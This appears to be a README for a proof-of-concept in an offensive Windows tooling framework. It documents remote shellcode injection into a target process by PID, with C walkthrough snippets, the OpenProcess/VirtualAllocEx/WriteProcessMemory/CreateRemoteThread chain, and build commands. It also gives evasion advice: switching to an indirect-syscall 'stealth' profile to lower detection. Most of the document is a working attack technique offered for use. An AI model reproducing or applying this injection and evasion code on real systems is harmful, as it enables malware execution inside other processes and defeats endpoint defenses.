# PoC: inject_shell

**Location:** `pocs/inject_shell/`

Classic remote shellcode injection into a target process. Reads raw bytes from disk and runs the full **Alloc → Write → Protect → Execute** pipeline via `snd_inj_classic_shell`.

## What it demonstrates

- Shared injection context (`snd_inj_ctx_t`) with `snd_inj_classic_shell`
- KnownDlls bootstrap + syscall pipeline setup (present in source)
- Win32 remote process API (`snd_proc_win`) for cross-process operations
- Disk payload loading with `snd_disk_buffer_load`

## Command-line usage

```text
inject_shell -f <payload_path> -p <target_pid>

  -f   Path to raw shellcode file
  -p   Target process ID (decimal)
```

### Example

```bash
inject_shell.exe -f shellcode.bin -p 1234
```

The remote thread starts at the allocation base — the entire file contents are treated as executable shellcode.

## Walkthrough

### 1. Load shellcode

```c
snd_buffer_t  inject_buf = {0};
snd_inj_ctx_t inj_ctx    = {0};

status = snd_disk_buffer_load(file_path, &inject_buf);
```

### 2. Bootstrap syscall pipeline (optional for current profile)

```c
PVOID ntdll = NULL;
status = snd_om_knowndll_map(&snd_map_nt, L"ntdll.dll", &ntdll);

snd_syscall_set_ntdll(ntdll);
snd_syscall_set_resolver(snd_syscall_resolve_ssn_scan);
snd_syscall_add_resolver(snd_syscall_resolve_ssn_sort);
snd_syscall_set_invoker(snd_syscall_indirect_invoke_asm);
snd_syscall_set_gadget_finder(snd_syscall_find_gadget_scan);
```

This PoC bootstraps the pipeline but uses `snd_proc_win` for injection. Swap to `&snd_proc_sys` to use the prepared pipeline for stealth remote operations.

### 3. Configure injection context

```c
inj_ctx.target_pid = target_pid;
inj_ctx.payload    = &inject_buf;
inj_ctx.proc_api   = &snd_proc_win;
```

### 4. Run classic shell chain

```c
status = snd_inj_classic_shell(&inj_ctx);
// open → alloc (RW) → write → protect (RX) → create_remote_thread
```

### 5. Cleanup

```c
snd_inj_cleanup(&inj_ctx);
snd_buffer_free(&inject_buf);
```

## Pipeline stages

| Step | Engine function | Remote effect |
|---|---|---|
| Open | `snd_inj_classic_open_target` | `OpenProcess(PROCESS_ALL_ACCESS)` |
| Alloc | `snd_inj_classic_alloc_remote` | `VirtualAllocEx` RW, size = shellcode length |
| Write | `snd_inj_classic_write_payload` | `WriteProcessMemory` |
| Protect | `snd_inj_classic_set_protections` | `VirtualProtectEx` → `PAGE_EXECUTE_READ` |
| Execute | `snd_inj_classic_execute` | `CreateRemoteThread` at allocation base |

## Building

```bash
cmake -B build -DSND_BUILD_PAYLOADS=ON
cmake --build build --config Release
```

## OpSec impact

**High visibility** — Win32 cross-process APIs. Suitable for validating the injection state machine before switching to `snd_proc_sys`.

For a stealth shellcode profile, keep the KnownDlls bootstrap and set `inj_ctx.proc_api = &snd_proc_sys`.

## See also

- [Injection techniques](../domains/injection/techniques.md)
- [inject_pe.md](inject_pe.md) — PE payload with full `_sys` profile
